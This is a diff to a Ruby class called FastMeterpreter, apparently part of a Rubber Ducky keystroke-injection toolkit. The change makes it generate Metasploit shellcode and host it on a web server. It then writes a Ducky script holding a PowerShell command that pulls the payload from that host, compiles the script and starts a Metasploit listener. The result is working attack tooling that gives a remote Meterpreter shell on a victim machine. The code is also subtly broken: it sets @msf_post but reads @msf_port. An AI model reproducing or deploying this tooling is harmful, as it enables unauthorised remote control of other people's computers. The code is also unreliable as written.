@@ -9,19 +9,34 @@ class FastMeterpreter < Skeleton
   description << 'from a web server'
 
   def setup
-    server_setup = Server::Setup.new
-    @host = server_setup.host
-    @port = server_setup.port
-    @ssl = server_setup.use_ssl?
     @msf = Msf::MsfCommands.new
+    @host = @server_setup.host
+    @port = @server_setup.port
+    @ssl = @server_setup.use_ssl?
+    @payload = @msf.payload_select
+    @msf_host = @msf.host
+    @msf_post = @msf.port
   end
 
   def run
+    shellcode = @msf.generate_shellcode(@msf_host, @msf_port, @payload)
     server = Server::Start.new(@ssl, @host, @port)
-    server.ruby_web
+    Thread.new { server.ruby_web(shellcode) } if @server_setup.host_payload?
   end
 
-  def finish; end
+  def finish
+    priv_choice = @ducky_writer.menu
+    File.open("#{text_path}#{self.class.title}.txt", 'w') do |f|
+      f.write(@ducky_writer.write(priv_choice))
+      if @ssl
+        f.write(powershell_command("https://#{@host}:#{@port}"))
+      else
+        f.write(powershell_command("http://#{@host}:#{@port}"))
+      end
+    end
+    Ducky::Compile.new("#{self.class.title}.txt")
+    @msf.start(@msf_host, @msf_port) if @msf.start_metasploit?
+  end
 
   private
 
